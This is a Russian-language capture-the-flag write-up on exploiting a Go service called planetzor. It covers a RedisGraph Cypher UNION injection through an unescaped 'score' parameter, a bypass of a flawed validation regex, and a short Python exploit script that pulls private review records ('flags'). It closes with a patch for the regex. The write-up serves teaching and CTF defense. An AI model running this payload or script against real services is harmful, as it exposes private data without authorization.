# Инъекция в planetzor
## Поиск уязвимости
Сервис написан на Go. Основной файл - main.go
Для работы с базой данных используется файл db/db.go

Одна из самых частых ошибок - инъекции в запросы к базе данных. Посмотрим какие базы данных используются здесь:

![](https://raw.githubusercontent.com/ArturLukianov/StayHomeWriteup/master/images/Screenshot%20from%202020-05-05%2018-50-33.png)

Используется redis и redisgraph. Поищем, не используется ли где сырой запрос в базу данных:

![](https://github.com/ArturLukianov/StayHomeWriteup/blob/master/images/Screenshot%20from%202020-05-05%2018-09-31.png)
![](https://github.com/ArturLukianov/StayHomeWriteup/blob/master/images/Screenshot%20from%202020-05-05%2018-07-36.png)

Поищем, где используется функция graphQuery():
![](https://github.com/ArturLukianov/StayHomeWriteup/blob/master/images/Screenshot%20from%202020-05-05%2018-08-03.png)
![](https://github.com/ArturLukianov/StayHomeWriteup/blob/master/images/Screenshot%20from%202020-05-05%2018-08-14.png)
![](https://github.com/ArturLukianov/StayHomeWriteup/blob/master/images/Screenshot%20from%202020-05-05%2018-08-27.png)
graphQuery() экранирует двойные кавычки, поэтому отбросим то, где ввод находится между кавычек. Ещё отбросим то, где ввод вообще не используется. Тогда останется только одна функция с сырым запросом, который мы можем эксплуатировать:

![](https://github.com/ArturLukianov/StayHomeWriteup/blob/master/images/Screenshot%20from%202020-05-05%2018-09-31.png)

Посмотрим как мы можем проэксплуатировать запрос:

![](https://github.com/ArturLukianov/StayHomeWriteup/blob/master/images/Screenshot%20from%202020-05-05%2018-32-59.png)

Параметр "planet" экранируется - это нам не подходит

Зато параметр score не экранируется. Попробуем payload.

## Разработка payload

Находим [документацию](https://oss.redislabs.com/redisgraph/commands/). Сделаем UNION инъекцию.

```
MATCH (r:Review {private: FALSE, planet: "planet"}) WHERE r.score = 1 RETURN r UNION MATCH (r:Review)
```
Ограничим вывод публичных записей, они нам не нужны:
```
MATCH (r:Review {private: FALSE, planet: "%s"}) WHERE r.score = 1 RETURN r LIMIT 1 UNION MATCH (r:Review {private: TRUE})
```

Итоговый payload:
```
1 RETURN r LIMIT 1 UNION MATCH (r:Review)
```

## Поиск точки эксплуатации

Мы нашли, что эксплуатировать и как. Осталось найти url и в каком виде передавать параметры:
![](https://github.com/ArturLukianov/StayHomeWriteup/blob/master/images/Screenshot%20from%202020-05-05%2018-12-37.png)
![](https://github.com/ArturLukianov/StayHomeWriteup/blob/master/images/Screenshot%20from%202020-05-05%2018-30-40.png)

Параметры передаются в GET запросе и не требуют аутентификации

Тут можно заметить, что параметр score проверятся score с помощью ValidateScore, который мешает эксплуатации

![](https://github.com/ArturLukianov/StayHomeWriteup/blob/master/images/Screenshot%20from%202020-05-05%2019-42-20.png)

## Обход ValidateScore

Регулярное выражение неправильно - оно проверяет на наличие хотя бы одного символа подходящего под [1-5], и такой присутствует в нашем payload. Обойдено.

## Эксплуатация

Протестируем наш payload.
Вначале создадим приватную запись с "флагом":
Проверим, что флаг не отображается публично:
Попробуем использовать наш payload:
Отлично, всё работает!

Сделаем sploit для destructive farm:
```
import requests
import sys

payload = "1 RETURN r LIMIT 1 UNION MATCH (r:Review)"

ip = sys.argv[1]
url = "http://" + ip + ":4000/reviews"
print(requests.get(url, params={'score': payload}).text)
```

##  Патчинг

Для патчинга достаточно починить регулярное выражение:

![](https://github.com/ArturLukianov/StayHomeWriteup/blob/master/images/Screenshot%20from%202020-05-05%2019-42-20.png)
